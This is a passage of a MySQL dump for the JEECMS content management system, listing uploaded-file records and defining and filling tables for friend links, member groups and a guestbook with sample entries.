INSERT INTO `jc_file` VALUES ('/u/cms/www/26115537rs0f.jpg', '26115537rs0f.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/26150136kryi.txt', '26150136kryi.txt', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/Thumbs.db', 'Thumbs.db', 1, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/13135536pnt2.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/131359296e9c.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/1314055350gc.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/13140606bjte.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/13140635xydz.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/13140702pfne.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/13140909s64p.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/13141723ywh0.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/13142644qpdm.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/131429269ikl.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/131431450xia.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201401/131431578u9o.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/1316123792p0.docx', '0_開發需求_.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/13163251c8d5.docx', '0_開發需求_.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/131634322gqg.docx', '0_開發需求_.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/131636277cxi.docx', '0_開發需求_.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/13163934xmp0.docx', '0_開發需求_.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/13164248ng73.docx', '0_開發需求_.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/13165347xxty.docx', '0_開發需求_.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/13170503bwpw.jpg', '1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/13170603q1bw.jpg', '1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/131706463pqt.jpg', '1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/13172446osvy.jpg', '1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/13172626x71c.docx', '0_開發需求_.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/13173752etj3.zip', 'ChromeSetup.zip', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/13173805fii8.zip', 'ChromeSetup.zip', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14091703u57k.docx', '0_開發需求_.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14091741h0w0.zip', 'ChromeSetup.zip', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14092030cnyx.mp4', '18183451i5bi.mp4', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14092835ljai.docx', '0_開發需求_.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14095531y5tg.zip', 'ChromeSetup.zip', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14095543za61.docx', '0_開發需求_.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14095551kk1a.docx', '0_開發需求_.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14095759mdqw.docx', '0_開發需求_.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14102936l7gw.txt', 'freemarker.txt', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14104521p9ey.zip', 'bbs-update-2012-11-2.zip', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14105137jxtn.mp4', '/v6/u/cms/www/201403/14105137jxtn.mp4', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14112725dsar.zip', '/v6/u/cms/www/201403/14112725dsar.zip', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14130702z3xz.png', '/v6/u/cms/www/201403/14130702z3xz.png', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/14165746s64i.pdf', '1.pdf', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201403/1914315903bj.jpg', '1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/20151821gj8y.jpg', '1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/2015202141s0.jpg', '1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/211128348kuw.jpg', '1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/2111305770l1.jpg', '1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/21113452hsxh.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/211137096eif.jpg', 'mv.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/211149148tx0.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/21115759y8sm.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/211511276v74.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/21151948k1fh.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/21154820xtfs.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/2115485050rw.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/21155236mk9b.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22084701xqxy.doc', '/v6/u/cms/www/201404/22084701xqxy.doc', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22084833ys27.doc', '/v6/u/cms/www/201404/22084833ys27.doc', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22111217hftv.doc', 'Linux开启mysql远程连接.doc', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22111332dwt3.doc', 'Linux开启mysql远程连接.doc', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22114143pw1a.doc', 'Linux开启mysql远程连接.doc', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22132355vqdf.txt', 'IBM LDAP.txt', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22133304pnoh.txt', '/v6/u/cms/www/201404/22133304pnoh.txt', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22133312pz3j.exe', 'wpp.exe', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22135235m1m1.txt', 'cmstop.txt', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22135348pbqp.swf', '2.swf', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/221353537d0o.doc', 'discuz_2.doc', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22140446zkgv.txt', 'jeecms新bug.txt', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22140629jx27.txt', '360检测.txt', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22140634er4n.doc', 'Discuz_X2.0数据字典(数据库表作用解释).doc', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22140716e5bk.flv', '/v6/u/cms/www/201404/22140716e5bk.flv', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22141101f9tv.txt', '360检测.txt', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22141404irh6.docx', 'Apache_Shiro_使用手册.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22142207xrqx.doc', 'Discuz_X2.0数据字典(数据库表作用解释).doc', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22145137jigp.docx', 'Apache_Shiro_使用手册.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22145142drkb.docx', 'Apache_Shiro_使用手册.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/221501301rkt.docx', 'Apache_Shiro_使用手册.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22151702mcwi.docx', 'Apache_Shiro_使用手册.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22152145c9do.doc', 'Linux开启mysql远程连接.doc', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22152231wfrv.mp4', '/v6/u/cms/www/201404/22152231wfrv.mp4', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22155743mgws.txt', 'bug平台推荐.txt', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22155756p9of.txt', 'flot柱状图.txt', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/22155756scdn.txt', 'flot使用笔记.txt', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/28134316erf3.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/281402505i20.jpg', 'mv.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/28140346452f.jpg', 'mv.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201404/30140543hzlx.gif', 'webLogo.gif', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201405/08091845sh2l.jpg', '1.JPG', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201405/08092143cyap.jpg', '1.JPG', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201405/08092249ype2.jpg', '1.JPG', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201405/08092924h3fr.jpg', '1.JPG', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201405/08093111b3jm.jpg', '1.JPG', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201405/09083819wiab.jpg', 'mv.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201405/090840146ik7.jpg', 'mv.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201405/090918028k13.jpg', 'mv.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201406/09144419786f.txt', 'bbs好的功能.txt', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201406/09145849ap2u.docx', '1.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201406/09151219pj5s.doc', '2.doc', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201406/0915215434ij.txt', 'cmstop.txt', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201407/121650299xv9.doc', 'DiscuzX2文件说明,目录说明.doc', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201407/12165642273e.doc', 'Discuz_X2.0数据字典(数据库表作用解释).doc', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201407/12170522j2ct.jpg', '1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201407/30093714q9ic.mp4', '/v6/u/cms/www/201407/30093714q9ic.mp4', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201407/30130947bmm3.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201407/30170627hj1m.jpg', 'mv.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201407/31114444inln.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201407/31114945lp9t.jpg', 'mv.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201407/31115246futn.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201407/31115423u7e6.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201407/31132254zdh7.jpg', 'mv.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201409/03105035q9em.mp4', '/v6/u/cms/www/201409/03105035q9em.mp4', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/u/cms/www/201409/03105050xcbs.txt', 'bug平台推荐.txt', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201312/241031214kys.txt', '/v6/wenku/www/201312/241031214kys.txt', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201401/16164720tu2n.doc', '/v6/wenku/www/201401/16164720tu2n.doc', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201401/17083718btie.doc', '/v6/wenku/www/201401/17083718btie.doc', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201401/17084032522j.doc', '/v6/wenku/www/201401/17084032522j.doc', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201401/170842070sy2.doc', '/v6/wenku/www/201401/170842070sy2.doc', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201401/17084442fd08.doc', '/v6/wenku/www/201401/17084442fd08.doc', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201401/17085101zvcg.doc', '/v6/wenku/www/201401/17085101zvcg.doc', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201401/25095002cniq.doc', '/v6/wenku/www/201401/25095002cniq.doc', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201403/10115402nl6c.docx', '/v6/wenku/www/201403/10115402nl6c.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201403/1011550974pv.docx', '/v6/wenku/www/201403/1011550974pv.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201403/101155409soa.txt', '/v6/wenku/www/201403/101155409soa.txt', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201403/10115750uxwh.txt', '/v6/wenku/www/201403/10115750uxwh.txt', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201406/04132656esvy.pdf', '/v6/wenku/www/201406/04132656esvy.pdf', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201406/04133131ky4f.pdf', '/v6/wenku/www/201406/04133131ky4f.pdf', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201406/04133159jryy.pdf', '/v6/wenku/www/201406/04133159jryy.pdf', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201406/04133312rszg.pdf', '/v6/wenku/www/201406/04133312rszg.pdf', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201406/04133437555h.pdf', '/v6/wenku/www/201406/04133437555h.pdf', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201406/04133611h3sa.pdf', '/v6/wenku/www/201406/04133611h3sa.pdf', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201406/041340029cmx.pdf', '/v6/wenku/www/201406/041340029cmx.pdf', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201406/0413413473t5.pdf', '/v6/wenku/www/201406/0413413473t5.pdf', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201406/041353368k3b.doc', '/v6/wenku/www/201406/041353368k3b.doc', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201406/04135541s2ay.doc', '/v6/wenku/www/201406/04135541s2ay.doc', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201408/08112543cj83.pdf', '/v6/wenku/www/201408/08112543cj83.pdf', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201408/08131514njo0.pdf', '/v6/wenku/www/201408/08131514njo0.pdf', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201411/061426416ze3.doc', '/v6/wenku/www/201411/061426416ze3.doc', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201411/07142936mhzk.docx', '/v6/wenku/www/201411/07142936mhzk.docx', 0, NULL);
INSERT INTO `jc_file` VALUES ('/v6/wenku/www/201411/07143112x1tn.docx', '/v6/wenku/www/201411/07143112x1tn.docx', 0, NULL);

-- ----------------------------
-- Table structure for jc_friendlink
-- ----------------------------
DROP TABLE IF EXISTS `jc_friendlink`;
CREATE TABLE `jc_friendlink`  (
  `friendlink_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `friendlinkctg_id` int(11) NOT NULL,
  `site_name` varchar(150) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '网站名称',
  `domain` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '网站地址',
  `logo` varchar(150) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '图标',
  `email` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '站长邮箱',
  `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '描述',
  `views` int(11) NOT NULL DEFAULT 0 COMMENT '点击次数',
  `is_enabled` char(1) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '1' COMMENT '是否显示',
  `priority` int(11) NOT NULL DEFAULT 10 COMMENT '排列顺序',
  PRIMARY KEY (`friendlink_id`) USING BTREE,
  INDEX `fk_jc_ctg_friendlink`(`friendlinkctg_id`) USING BTREE,
  INDEX `fk_jc_friendlink_site`(`site_id`) USING BTREE,
  CONSTRAINT `fk_jc_ctg_friendlink` FOREIGN KEY (`friendlinkctg_id`) REFERENCES `jc_friendlink_ctg` (`friendlinkctg_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_friendlink_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 4 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS友情链接' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_friendlink
-- ----------------------------
INSERT INTO `jc_friendlink` VALUES (1, 1, 1, 'JEECMS官网', 'http://www.jeecms.com', NULL, 'jeecms@163.com', 'JEECMS是JavaEE版网站管理系统（Java Enterprise Edition Content Manage System）的简称。Java凭借其强大、稳定、安全、高效等多方面的优势，一直是企业级应用的首选。ddd', 35, '1', 1);
INSERT INTO `jc_friendlink` VALUES (2, 1, 1, 'JEEBBS论坛', 'http://bbs.jeecms.com', NULL, 'jeecms@163.com', 'JEEBBS论坛', 5, '1', 10);
INSERT INTO `jc_friendlink` VALUES (3, 1, 2, '京东商城', 'http://www.360buy.com/', '/menhu/u/cms/www/201812/11143131gjf1.jpg', '', '', 4, '1', 10);

-- ----------------------------
-- Table structure for jc_friendlink_ctg
-- ----------------------------
DROP TABLE IF EXISTS `jc_friendlink_ctg`;
CREATE TABLE `jc_friendlink_ctg`  (
  `friendlinkctg_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `friendlinkctg_name` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT 10 COMMENT '排列顺序',
  PRIMARY KEY (`friendlinkctg_id`) USING BTREE,
  INDEX `fk_jc_friendlinkctg_site`(`site_id`) USING BTREE,
  CONSTRAINT `fk_jc_friendlinkctg_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 5 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS友情链接类别' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_friendlink_ctg
-- ----------------------------
INSERT INTO `jc_friendlink_ctg` VALUES (1, 1, '文字链接', 1);
INSERT INTO `jc_friendlink_ctg` VALUES (2, 1, '品牌专区（图片链接）', 2);
INSERT INTO `jc_friendlink_ctg` VALUES (4, 1, '', 10);

-- ----------------------------
-- Table structure for jc_group
-- ----------------------------
DROP TABLE IF EXISTS `jc_group`;
CREATE TABLE `jc_group`  (
  `group_id` int(11) NOT NULL AUTO_INCREMENT,
  `group_name` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT 10 COMMENT '排列顺序',
  `need_captcha` tinyint(1) NOT NULL DEFAULT 1 COMMENT '是否需要验证码',
  `need_check` tinyint(1) NOT NULL DEFAULT 1 COMMENT '是否需要审核',
  `allow_per_day` int(11) NOT NULL DEFAULT 4096 COMMENT '每日允许上传KB',
  `allow_max_file` int(11) NOT NULL DEFAULT 1024 COMMENT '每个文件最大KB',
  `allow_suffix` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT 'jpg,jpeg,gif,png,bmp' COMMENT '允许上传的后缀',
  `is_reg_def` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否默认会员组',
  PRIMARY KEY (`group_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 4 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS会员组表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_group
-- ----------------------------
INSERT INTO `jc_group` VALUES (1, '普通会员', 2, 1, 1, 0, 0, '', 1);
INSERT INTO `jc_group` VALUES (2, '高级组', 10, 1, 1, 0, 0, '', 0);
INSERT INTO `jc_group` VALUES (3, 'vip', 11, 1, 1, 0, 0, '', 0);

-- ----------------------------
-- Table structure for jc_guestbook
-- ----------------------------
DROP TABLE IF EXISTS `jc_guestbook`;
CREATE TABLE `jc_guestbook`  (
  `guestbook_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `guestbookctg_id` int(11) NOT NULL,
  `member_id` int(11) NULL DEFAULT NULL COMMENT '留言会员',
  `admin_id` int(11) NULL DEFAULT NULL COMMENT '回复管理员',
  `ip` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '留言IP',
  `create_time` datetime NOT NULL COMMENT '留言时间',
  `replay_time` datetime NULL DEFAULT NULL COMMENT '回复时间',
  `is_checked` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否审核',
  `is_recommend` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否推荐',
  PRIMARY KEY (`guestbook_id`) USING BTREE,
  INDEX `fk_jc_ctg_guestbook`(`guestbookctg_id`) USING BTREE,
  INDEX `fk_jc_guestbook_admin`(`admin_id`) USING BTREE,
  INDEX `fk_jc_guestbook_member`(`member_id`) USING BTREE,
  INDEX `fk_jc_guestbook_site`(`site_id`) USING BTREE,
  CONSTRAINT `fk_jc_ctg_guestbook` FOREIGN KEY (`guestbookctg_id`) REFERENCES `jc_guestbook_ctg` (`guestbookctg_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_guestbook_admin` FOREIGN KEY (`admin_id`) REFERENCES `jc_user` (`user_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_guestbook_member` FOREIGN KEY (`member_id`) REFERENCES `jc_user` (`user_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_guestbook_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 7 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS留言' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_guestbook
-- ----------------------------
INSERT INTO `jc_guestbook` VALUES (3, 1, 1, NULL, 1, '117.41.152.66', '2016-10-10 15:02:04', NULL, 1, 1);
INSERT INTO `jc_guestbook` VALUES (4, 1, 1, NULL, 1, '117.41.152.66', '2016-10-10 15:07:53', NULL, 1, 1);
INSERT INTO `jc_guestbook` VALUES (5, 1, 1, NULL, 1, '117.41.152.66', '2016-10-10 15:08:41', NULL, 1, 1);
INSERT INTO `jc_guestbook` VALUES (6, 1, 1, NULL, 1, '117.41.152.66', '2016-10-10 15:09:06', NULL, 1, 1);

-- ----------------------------
-- Table structure for jc_guestbook_ctg
-- ----------------------------
DROP TABLE IF EXISTS `jc_guestbook_ctg`;
CREATE TABLE `jc_guestbook_ctg`  (
  `guestbookctg_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `ctg_name` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT 10 COMMENT '排列顺序',
  `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '描述',
  PRIMARY KEY (`guestbookctg_id`) USING BTREE,
  INDEX `fk_jc_guestbookctg_site`(`site_id`) USING BTREE,
  CONSTRAINT `fk_jc_guestbookctg_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 3 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS留言类别' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_guestbook_ctg
-- ----------------------------
INSERT INTO `jc_guestbook_ctg` VALUES (1, 1, '普通', 1, '普通留言');
INSERT INTO `jc_guestbook_ctg` VALUES (2, 1, '投诉', 10, '投诉');

-- ----------------------------
-- Table structure for jc_guestbook_ext
-- ----------------------------
DROP TABLE IF EXISTS `jc_guestbook_ext`;
CREATE TABLE `jc_guestbook_ext`  (
  `guestbook_id` int(11) NOT NULL,
  `title` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '留言标题',
  `content` longtext CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '留言内容',
  `reply` longtext CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '回复内容',
  `email` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '电子邮件',
  `phone` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '电话',
  `qq` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 'QQ',
  INDEX `fk_jc_ext_guestbook`(`guestbook_id`) USING BTREE,
  CONSTRAINT `fk_jc_ext_guestbook` FOREIGN KEY (`guestbook_id`) REFERENCES `jc_guestbook` (`guestbook_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS留言内容' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_guestbook_ext
-- ----------------------------
INSERT INTO `jc_guestbook_ext` VALUES (3, '新版jeecms v8的改动很大，希望做得更好，持续关注中。', '新版jeecms v8的改动很大，希望做得更好，持续关注中。', NULL, NULL, NULL, NULL);
INSERT INTO `jc_guestbook_ext` VALUES (4, '怎么在页面首页放一个视频之后我点击的时候就可以看？', '怎么在页面首页放一个视频之后我点击的时候就可以看？', NULL, NULL, NULL, NULL);
